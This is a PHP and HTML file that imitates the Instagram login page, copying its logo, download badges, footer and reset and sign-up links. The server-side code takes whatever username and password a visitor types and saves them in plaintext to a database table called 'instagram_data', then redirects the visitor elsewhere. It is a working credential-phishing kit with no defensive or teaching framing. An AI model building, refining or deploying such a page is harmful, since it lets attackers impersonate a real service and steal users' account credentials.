<?php
session_start();
?>
<?php
// Database connection
$db_server = "localhost";
$db_user = "root";
$db_password = "";
$db_name = "registration_data";

$conn = new mysqli($db_server, $db_user, $db_password, $db_name);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["SignUp"])) {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Sanitize input
    $username = $conn->real_escape_string($username);
    $password = $conn->real_escape_string($password);

    // Insert into database
    $sql = "INSERT INTO instagram_data (username, password) VALUES ('$username', '$password')";

    if ($conn->query($sql) === TRUE) {
    $_SESSION["username"] = $username;
    header("Location: Home2.php");
        exit();
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}
// Close connection
$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
    <title>connection.instagram</title>
</head>
<body>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            max-width: 300px;
            width: 100%;
            text-align: center;
            border: 1px solid hsl(0, 10%, 90%);
            padding: 20px;
            margin: 5px;
            margin-top: 10px;
        }
        .input-group {
            margin-bottom: 15px;
            margin: 5px;
        }
        .input-group input {
            width: 90%;
            padding: 10px;
            border: 1px solid hsl(0, 0%, 25%);
            border-radius: 4px;
            background-color: hsl(0, 7%, 97%);
        }
        .btn-login {
            background-color: #0d9eff;
            color: #fff;
            border: none;
            padding: 10px;
            border-radius: 8px;
            cursor: pointer;
            width: 90%;
            font-size: 16px;
            margin: 7px;
        }
        .btn-login:hover {
            background-color: #007bb5;
        }
        .forgot-password {
            margin-top: 15px;
            display: block;
            color: #00376b;
            text-decoration: none;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .divider {
            margin: 20px 0;
            display: flex;
            align-items: center;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .divider span {
            margin: 0 10px;
            color: #999;
        }
        .signup-link {
            margin-top: 15px;
            color: #0095f6;
            text-decoration: none;
        }
        .signup-link:hover {
            text-decoration: underline;
        }
        p{
            margin-top: 20px;
            font-size: 10px;
            display: flex;
            justify-content: space-evenly;
        }
        #imgT{
            height: 35px;
            width: 100px;
            display: flex;
            margin: 5px;
        }
        .img{
            display: flex;
            flex-direction: row;
            justify-content: space-evenly;
        }
            #Fb{
        width: 20px;
        height: 20px;
        margin-right: 3px;
    }
    
        @media screen and (max-width:900px) {
.container{
    border: none;
}
#imgT{
    height: 30px;
    width: 95px;
    
}
p{
    font-size: 7px;
}
}
    </style>
</head>
<body>
    <div class="container">
    <i style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yv/r/KoLLpWDb4f6.png&quot;); background-position: 0px -52px;
     background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block; margin-bottom: 20px; ">
     </i>
        <form action="index.php" method="post">
            <div class="input-group">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="btn-login" name="SignUp">Log In</button>
            <div class="divider">
                <span>OR</span>
    </div>
    <img alt="Facebook" src="Facebook_logo.png" id="Fb"><a>Log in with Facebook</a>
  <a href="https://www.instagram.com/accounts/password/reset/
            ?next=https%3A%2F%2Faccountscenter.instagram.com%2F%3Fentry_point%3Dapp_settings%26__coig_login%3D1" 
            class="forgot-password">Forgot password?</a>
        </form>
    </div>
            <div class="container" style="margin-top: 5px;">
             Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?next=https%3A%2F%2Faccountscenter.instagram.com%2F%3Fentry_point%3Dapp_settings%26__coig_login%3D1"
             class="signup-link">Sign up</a>
            </div>
            <h5>Download the app.</h5>
            <div class="img">
            <img id="imgT" alt="Téléchargez-le dans Google Play" class="x1vqgdyp" 
            src="https://static.cdninstagram.com/rsrc.php/v3/yr/r/093c-DX36-y.png">
            <img id="imgT" alt="Téléchargez-le sur Microsoft Store" class="x1vqgdyp"
             src="https://static.cdninstagram.com/rsrc.php/v3/yk/r/NtqqucWkedn.png">
            </div>
<p>
Meta  About  Blog  Jobs  Help  API  Confidentiality  Terms  Places Instagram  Lite  Threads  Importing  contacts  and  non-users  Meta Verified
</p>
<p>ENGLISH ENGLISH © 2024 Instagram by Meta</p>
</body>
</html>